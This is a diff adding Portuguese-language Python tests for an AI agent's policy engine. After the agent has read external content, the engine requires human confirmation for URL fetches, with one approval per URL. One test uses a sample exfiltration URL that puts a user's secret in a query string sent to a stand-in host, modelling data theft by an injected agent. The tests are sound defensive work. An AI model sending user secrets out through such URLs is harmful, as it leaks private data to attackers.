@@ -213,3 +213,63 @@ def test_aprovacao_libera_a_leitura_do_segredo_uma_vez(engine, ctx, raiz):
     engine.approvals.decide(d.approval_id, True, channel="telegram", actor="antonio")
     assert engine.evaluate(chamada, ctx).action is Action.ALLOW
     assert engine.evaluate(chamada, ctx).action is Action.CONFIRM  # uso único
+
+
+# ── egress: o modelo escolhe o destino na rede (exfiltração por GET) ───────────
+def _motor(tmp_path):
+    return PolicyEngine(path_guard=PathGuard(protected_roots=(tmp_path / "p",), safe_roots=()))
+
+
+def test_buscar_url_roda_direto_numa_sessao_limpa(tmp_path):
+    d = _motor(tmp_path).evaluate(
+        ToolCall("buscar_url", {"url": "https://exemplo.com"}), Context("s")
+    )
+    assert d.action is Action.ALLOW
+
+
+def test_depois_de_ler_conteudo_externo_buscar_url_confirma_com_a_url_inteira(tmp_path):
+    motor = _motor(tmp_path)
+    ctx = Context("s")
+    motor.note_result(ToolCall("buscar_url", {"url": "https://exemplo.com"}), ctx)  # contaminou
+    alvo = {"url": "https://dono-da-pagina.example/?d=SEGREDO-DO-USUARIO"}
+    d = motor.evaluate(ToolCall("buscar_url", alvo), ctx)
+    assert d.action is Action.CONFIRM and d.risk is Risk.READ and "exfiltração" in d.reason
+    assert d.approval_id is not None
+    pedido = motor.approvals.get(d.approval_id)
+    assert pedido is not None and pedido.args == alvo  # quem aprova vê a URL que sairia
+    motor.approvals.decide(d.approval_id, True, channel="telegram", actor="antonio")
+    assert motor.evaluate(ToolCall("buscar_url", alvo), ctx).action is Action.ALLOW  # uso único
+    assert motor.evaluate(ToolCall("buscar_url", alvo), ctx).action is Action.CONFIRM
+
+
+def test_aprovacao_de_uma_url_nao_vale_para_outra(tmp_path):
+    motor = _motor(tmp_path)
+    ctx = Context("s", tainted=True)
+    a = {"url": "https://a.example/"}
+    d = motor.evaluate(ToolCall("buscar_url", a), ctx)
+    assert d.approval_id is not None
+    motor.approvals.decide(d.approval_id, True, channel="web", actor="antonio")
+    assert motor.evaluate(
+        ToolCall("buscar_url", {"url": "https://b.example/?d=x"}), ctx
+    ).action is (Action.CONFIRM)
+
+
+def test_ferramenta_sem_egress_continua_livre_numa_sessao_contaminada(tmp_path):
+    motor = _motor(tmp_path)
+    ctx = Context("s", tainted=True)
+    for nome, args in (
+        ("buscar_memoria", {"consulta": "x"}),
+        (
+            "consultar_clima",
+            {"cidade": "Marília"},
+        ),  # destino fixo (Open-Meteo): não é canal do atacante
+        ("pesquisar_com_ia", {"query": "x"}),  # destino fixo (Google)
+    ):
+        assert motor.evaluate(ToolCall(nome, args), ctx).action is Action.ALLOW, nome
+
+
+def test_navegar_web_mcp_e_buscar_url_compartilham_a_regra(tmp_path):
+    from orion.policy import DEFAULT_TOOLS
+
+    assert DEFAULT_TOOLS["buscar_url"].egress and DEFAULT_TOOLS["navegar_web"].egress
+    assert [n for n, s in DEFAULT_TOOLS.items() if s.egress] == ["buscar_url", "navegar_web"]
